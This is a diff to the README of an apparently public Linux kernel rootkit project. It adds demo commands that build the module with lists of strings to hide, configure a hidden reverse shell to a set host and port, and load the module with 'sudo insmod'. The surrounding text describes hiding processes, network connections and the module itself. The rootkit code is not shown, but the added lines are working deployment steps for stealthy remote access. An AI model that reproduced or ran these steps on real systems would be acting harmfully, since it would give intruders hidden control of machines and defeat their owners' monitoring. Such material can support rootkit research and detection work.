@@ -25,11 +25,17 @@ Unlike traditional rootkits that rely on direct syscall table hooking or exporte
 - **Module Hiding** – Hides itself from kernel module listings
 
 ### Demo - Hiding names and processes
-
+```c
+make STRINGS_EXCLUDES="SOME_KEYWORD,hidden"
+sudo insmod mod_rootkit.ko
+```
 <img width="437" alt="image" src="https://github.com/user-attachments/assets/855ae402-1cbd-4f5c-97d4-c83573f18a75" />
 
 ### Demo - Hiding network connections and a hidden reverse shell
-
+```c
+make RSHELL_HOST=127.0.0.1 RSHELL_PORT=9001 NET_EXCLUDES=9001
+sudo insmod mod_rootkit.ko
+```
 <img width="437" alt="image" src="https://github.com/user-attachments/assets/c6fdb061-8fb6-4456-91a0-61037c303752" />
 
 ## Requirements
